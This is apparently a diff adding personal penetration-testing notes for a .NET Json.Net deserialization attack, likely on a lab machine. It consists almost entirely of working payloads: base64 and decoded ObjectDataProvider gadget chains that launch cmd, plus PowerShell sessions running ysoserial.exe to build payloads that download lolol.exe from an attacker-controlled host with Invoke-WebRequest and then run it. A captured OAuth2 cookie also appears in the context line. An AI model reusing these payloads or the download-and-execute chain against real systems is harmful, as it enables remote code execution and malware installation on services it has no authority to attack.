@@ -15,3 +15,44 @@ Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3Y
 
 ++++++++++++++++++++++++++++++++++++++
 ++++++++++++++++++++++++++++++++++++++
+
+(replace bearer token)
+(b64, ysoserial) 
+
+ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLCAKICAgICdNZXRob2ROYW1lJzonU3RhcnQnLAogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsKICAgICAgICAnJHR5cGUnOidTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLAogICAgICAgICckdmFsdWVzJzpbJ2NtZCcsJy9jIHBpbmcgMTAuMTAuMTQuNzMnXQogICAgfSwKICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30K
+
+
+{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
+    'MethodName':'Start',
+    'MethodParameters':{
+        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values':['cmd','/c ping 10.10.14.245']
+    },
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}
+
+
+++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++
+
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug> .\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "powershell.exe -Command Invoke-WebRequest -Uri http://10.10.14.73/lolol.exe -OutFile C:\tmp\lolol.exe" -t
+ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLCAKICAgICdNZXRob2ROYW1lJzonU3RhcnQnLAogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsKICAgICAgICAnJHR5cGUnOidTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLAogICAgICAgICckdmFsdWVzJzpbJ2NtZCcsJy9jIHBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgaHR0cDovLzEwLjEwLjE0LjczL2xvbG9sLmV4ZSAtT3V0RmlsZSBDOlx0bXBcbG9sb2wuZXhlJ10KICAgIH0sCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9Cn0=
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug> .\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "powershell.exe -Command Invoke-WebRequest -Uri http://10.10.14.73/lolol.exe -OutFile C:\tmp\lolol.exe" -t^C
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug> ^C
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug> ^C
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug> .\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "powershell.exe -Command Invoke-WebRequest -Uri http://10.10.14.73/lolol.exe -OutFile c:\windows\temp\lolol.exe"
+ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLCAKICAgICdNZXRob2ROYW1lJzonU3RhcnQnLAogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsKICAgICAgICAnJHR5cGUnOidTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLAogICAgICAgICckdmFsdWVzJzpbJ2NtZCcsJy9jIHBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgaHR0cDovLzEwLjEwLjE0LjczL2xvbG9sLmV4ZSAtT3V0RmlsZSBjOlx3aW5kb3dzXHRlbXBcbG9sb2wuZXhlJ10KICAgIH0sCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9Cn0=
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug> .\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "powershell.exe -Command Invoke-WebRequest -Uri http://10.10.14.73/lolol.exe -OutFile c:\\windows\\temp\\lolol.exe"
+ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLCAKICAgICdNZXRob2ROYW1lJzonU3RhcnQnLAogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsKICAgICAgICAnJHR5cGUnOidTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLAogICAgICAgICckdmFsdWVzJzpbJ2NtZCcsJy9jIHBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgaHR0cDovLzEwLjEwLjE0LjczL2xvbG9sLmV4ZSAtT3V0RmlsZSBjOlxcd2luZG93c1xcdGVtcFxcbG9sb2wuZXhlJ10KICAgIH0sCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9Cn0=
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug> .\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "c:\\windows\\temp\\lolol.exe"
+ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLCAKICAgICdNZXRob2ROYW1lJzonU3RhcnQnLAogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsKICAgICAgICAnJHR5cGUnOidTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLAogICAgICAgICckdmFsdWVzJzpbJ2NtZCcsJy9jIGM6XFx3aW5kb3dzXFx0ZW1wXFxsb2xvbC5leGUnXQogICAgfSwKICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30KfQ==
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
+PS C:\Users\Administrator\Downloads\ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>
